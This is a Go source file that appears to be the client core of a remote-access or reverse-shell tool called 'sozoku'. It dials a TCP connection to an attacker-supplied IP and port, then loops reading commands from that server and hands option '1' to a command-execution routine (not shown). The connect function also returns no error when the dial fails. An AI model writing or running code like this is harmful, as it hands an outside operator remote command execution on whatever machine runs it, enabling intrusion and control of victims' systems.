package core

import (
	"bufio"
	"fmt"
	"net"
	"strings"

	"github.com/brandon-a-pinto/sozoku/internal/client/execution"
)

func ConnectWithServer(IP, Port string) (conn net.Conn, err error) {
	address := IP + ":" + Port

	connection, err := net.Dial("tcp", address)
	if err != nil {
		fmt.Printf("[-] Connection refused\n")
	} else {
		fmt.Printf("[+] Connection established: %s\n", connection.RemoteAddr().String())
	}

	return connection, nil
}

func Options(connection net.Conn) {
	reader := bufio.NewReader(connection)
	loop := true

	for loop {
		rawInput, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			continue
		}

		input := strings.TrimSuffix(rawInput, "\n")

		switch {
		case input == "0":
			loop = false
		case input == "1":
			execution.ExecuteCommand(connection)
		default:
		}
	}
}
